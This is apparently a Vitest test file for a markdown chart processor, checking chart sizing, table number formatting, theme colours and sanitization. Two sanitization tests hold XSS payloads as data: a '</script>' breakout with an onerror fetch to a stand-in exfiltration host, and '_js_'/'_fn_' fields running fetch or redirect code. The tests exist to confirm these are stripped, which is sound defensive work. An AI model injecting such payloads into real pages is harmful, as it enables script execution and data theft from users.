import { describe, expect, it } from 'vitest';
import { processMvizMarkdown, sanitizeMvizMarkdown } from './mviz-processor';

describe('sanitizeMvizMarkdown', () => {
  it('normalizes default chart heights to 8 rows', () => {
    expect(sanitizeMvizMarkdown('```bar size=[8,4]\n{"data":[]}\n```')).toContain('```bar size=[8,8]');
    expect(sanitizeMvizMarkdown('```line\n{"data":[]}\n```')).toContain('```line size=[8,8]');
    expect(sanitizeMvizMarkdown('```dumbbell size=[12,5]\n{"data":[]}\n```')).toContain(
      '```dumbbell size=[12,8]'
    );
    expect(sanitizeMvizMarkdown('```bar size=[16,8]\n{"data":[]}\n```')).toContain('```bar size=[16,8]');
  });

  it('neutralizes </script> breakout in chart string values', () => {
    const evil =
      'Team X</script><img src=x onerror="fetch(`http://sentinel.invalid/exfil`)">';
    const sanitized = sanitizeMvizMarkdown(
      '```bar\n' + JSON.stringify({ title: 'T', data: [{ x: evil, y: 1 }] }) + '\n```'
    );
    // The literal closing-tag sequence must not survive into the spec JSON —
    // the slash is backslash-escaped so the HTML tokenizer can't match it.
    expect(sanitized).not.toContain('</script');
    expect(sanitized).toContain('Team X'); // label data itself preserved
    // Rendering through mviz must not produce an executable breakout either.
    const html = processMvizMarkdown(
      '```bar\n' + JSON.stringify({ title: 'T', data: [{ x: evil, y: 1 }] }) + '\n```'
    );
    expect(html).not.toMatch(/<\/script><img/i);
  });

  it('drops mviz raw-code escape hatches from chart specs', () => {
    const sanitized = sanitizeMvizMarkdown(
      '```bar\n' +
        JSON.stringify({
          title: 'T',
          data: [{ x: 'a', y: 1, _js_: '(()=>{fetch("http://sentinel.invalid")})()' }],
          formatter: { _fn_: 'window.location="http://evil"' },
        }) +
        '\n```'
    );
    expect(sanitized).not.toContain('_js_');
    expect(sanitized).not.toContain('_fn_');
    expect(sanitized).not.toContain('sentinel.invalid');
    expect(sanitized).not.toContain('evil');
  });

  it('defaults plain numeric table columns to auto formatting', () => {
    const sanitized = sanitizeMvizMarkdown(
      '```table\n' +
        JSON.stringify({
          columns: [
            { id: 'team', title: 'Team' },
            { id: 'points', title: 'Points', align: 'right' },
            { id: 'season_year', title: 'Season' },
            { id: 'margin', title: 'Margin', fmt: 'pct' },
          ],
          data: [
            { team: 'BOS', points: 10422, season_year: 2024, margin: 0.35 },
            { team: 'DEN', points: 10051, season_year: 2024, margin: 0.32 },
          ],
        }) +
        '\n```'
    );

    const spec = JSON.parse(sanitized.match(/```table\n([\s\S]*?)\n```/)?.[1] ?? '{}');
    expect(spec.columns).toEqual([
      { id: 'team', title: 'Team' },
      { id: 'points', title: 'Points', align: 'right', fmt: 'auto' },
      { id: 'season_year', title: 'Season' },
      { id: 'margin', title: 'Margin', fmt: 'pct' },
    ]);
  });

  it('does not add auto formatting to advanced table column types', () => {
    const sanitized = sanitizeMvizMarkdown(
      '```table\n' +
        JSON.stringify({
          columns: [
            { id: 'score', title: 'Score', type: 'heatmap' },
            { id: 'trend', title: 'Trend', type: 'sparkline', sparkType: 'line' },
          ],
          data: [
            { score: 91, trend: [1, 2, 3] },
            { score: 86, trend: [3, 2, 1] },
          ],
        }) +
        '\n```'
    );

    const spec = JSON.parse(sanitized.match(/```table\n([\s\S]*?)\n```/)?.[1] ?? '{}');
    expect(spec.columns).toEqual([
      { id: 'score', title: 'Score', type: 'heatmap' },
      { id: 'trend', title: 'Trend', type: 'sparkline', sparkType: 'line' },
    ]);
  });
});

describe('processMvizMarkdown', () => {
  it('uses the native mviz theme for colors, fonts, and multi-series palettes', () => {
    const barHtml = processMvizMarkdown(
      '```bar size=[8,12]\n' +
        JSON.stringify({
          type: 'bar',
          title: 'Revenue and Cost',
          x: 'month',
          y: ['revenue', 'cost'],
          format: 'auto',
          data: [
            { month: 'Jan', revenue: 120000, cost: 80000 },
            { month: 'Feb', revenue: 142000, cost: 91000 },
          ],
        }) +
        '\n```'
    );

    expect(barHtml).toContain('#9F7AEA');
    expect(barHtml).toContain('#0D9488');
    expect(barHtml).toContain('fonts.googleapis.com/css2?family=Inter');
    expect(barHtml).toContain('JetBrains+Mono');
    expect(barHtml).toContain('--bg:#FFFFFF');
    expect(barHtml).toContain('--text:#1C1E26');
    expect(barHtml).not.toContain('svg .bar');
    expect(barHtml).not.toContain('svg rect.bar');
    expect(barHtml).not.toContain('svg .line');

    const themedSeriesColors = [...barHtml.matchAll(/"color":"(#[0-9A-Fa-f]{6})"/g)]
      .map(match => match[1])
      .filter(color => color === '#9F7AEA' || color === '#0D9488');
    expect(new Set(themedSeriesColors)).toEqual(new Set(['#9F7AEA', '#0D9488']));

    const lineHtml = processMvizMarkdown(
      '```line size=[8,12]\n' +
        JSON.stringify({
          type: 'line',
          title: 'Active Users',
          x: 'month',
          y: 'users',
          data: [
            { month: 'Jan', users: 1200 },
            { month: 'Feb', users: 1500 },
          ],
        }) +
        '\n```'
    );
    expect(lineHtml).toContain('#9F7AEA');
    expect(lineHtml).toContain("--font-family:'Inter'");

    const tableHtml = processMvizMarkdown(
      '```table size=[16,5]\n' +
        JSON.stringify({
          title: 'Teams',
          columns: [
            { id: 'team', title: 'Team', bold: true },
            { id: 'points', title: 'Points' },
          ],
          data: [{ team: 'BOS', points: 10422 }],
        }) +
        '\n```'
    );
    expect(tableHtml).toContain("--font-mono:'JetBrains Mono'");
    expect(tableHtml).toContain('10.42k');
  });
});
